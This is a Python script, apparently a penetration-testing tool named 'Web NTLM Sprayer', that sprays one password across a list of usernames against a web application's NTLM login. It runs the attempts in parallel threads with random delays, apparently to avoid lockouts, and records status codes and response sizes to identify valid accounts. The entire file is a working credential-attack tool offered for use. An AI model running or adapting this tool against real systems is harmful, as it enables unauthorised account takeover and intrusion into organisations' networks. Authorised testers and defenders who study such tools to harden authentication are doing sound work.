#!/usr/bin/python3

#python3 -m pip install requests, tabulate, tqdm, requests_ntlm
import argparse
import requests
import sys
import glob
import concurrent
import concurrent.futures
from tqdm import tqdm
from itertools import repeat
import csv
from random import randint
from time import sleep
import re
from tabulate import tabulate
from requests_ntlm import HttpNtlmAuth
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print(f"\n {self.bold}*************** Web NTLM Sprayer ***************{self.end}")
        print(f"@initroot \n")

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")


def sprayUsers(user,url,domain,password,debug):
    #debug = False;
    session = requests.Session()
    session.max_redirects = 5
    sleep(randint(2,15))
    try:
        if debug is True:
            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
            r = session.get(url, auth = HttpNtlmAuth(domain + "\\" + user,password), proxies = proxies,verify=False)
            output.info([domain + '\\' + user,password, url,r.url, r.status_code,len(r.content)])
        else:
            r = session.get(url, auth = HttpNtlmAuth(domain + "\\" + user,password),verify=False)

    except requests.exceptions.ProxyError:                 
        r = session.get(url, auth = HttpNtlmAuth(domain + "\\" + user,password), verify=False)
        output.info([domain + '\\' + user,password, url,r.url, r.status_code,len(r.content)])
        return [domain + '\\' + user,password, url,r.url, r.status_code,len(r.content)]
    except requests.exceptions.TooManyRedirects as exc:
        r = exc.response
        output.info([domain + '\\' + user,password, url,r.url, r.status_code,len(r.content)])
    except requests.exceptions.ConnectionError as exc:
        r = exc.response
        output.info([domain + '\\' + user,password, url,r.url, r.status_code,len(r.content)])
        sleep(randint(10,15))

    return [domain + '\\' + user,password, url,r.url, r.status_code,len(r.content)]


def isBlank (myString):
    return not (myString and myString.strip())

def isNotBlank (myString):
    return bool(myString and myString.strip())

#removes duplicates from list and cleans nulls
def remDuplicates(x):
    res = list(filter(None, x))
    return list(dict.fromkeys(res))

def flatten(l, ltypes=(list, tuple)):
    ltype = type(l)
    l = list(l)
    i = 0
    while i < len(l):
        while isinstance(l[i], ltypes):
            if not l[i]:
                l.pop(i)
                i -= 1
                break
            else:
                l[i:i + 1] = l[i]
        i += 1
    return ltype(l)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--users',	 help='List of users to spray e.g. frank, pete. Do not include domain names!', required=True)
    parser.add_argument('-p', '--password', help='The password to spray e.g. Winter2020', required=True)
    parser.add_argument('-d', '--domain', help='The target domain.', required=True)
    parser.add_argument('-t', '--target', help='Restricted yarget web application URL e.g. http://localhost/Dashboard/Index.aspx', required=True)
    parser.add_argument('-v', '--verbose', help='Instruct our web requests to use our defined proxy', action='store_true', required=False)
    parser.add_argument('-o', '--output', help='Write results to output file', required=False)
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    if args.verbose:
        for k,v in sorted(vars(args).items()):
            if k == 'verbose':
                output.warning(f"Debugging Mode: {v}")
            else:
                output.info(f"{k}: {v}")

    #Read users
    try:
        users = open(args.users,"r").read().splitlines()
    except:
        output.error('Cannot read the file, check permissions!')
        os._exit(0) #we want to exit the whole process

    output.info('Starting spraying against ' + args.target + ' for ' + str(len(users)) + ' using format ' + args.domain + '\Username!\n Please be wait....')

    #add some argument parsing and validation here later
    with concurrent.futures.ThreadPoolExecutor(8) as executor:
        results = list(tqdm(executor.map(sprayUsers,users, repeat(args.target),repeat(args.domain), repeat(args.password),repeat(args.verbose)), total=len(users)))        
        output.info(tabulate(results))
        if args.output:
            output_file = args.output             
            with open(output_file, 'w') as file:
                write = csv.writer(file) 
                write.writerows(results)
    output.success('Done!') 
    
if __name__ == '__main__':
    main()
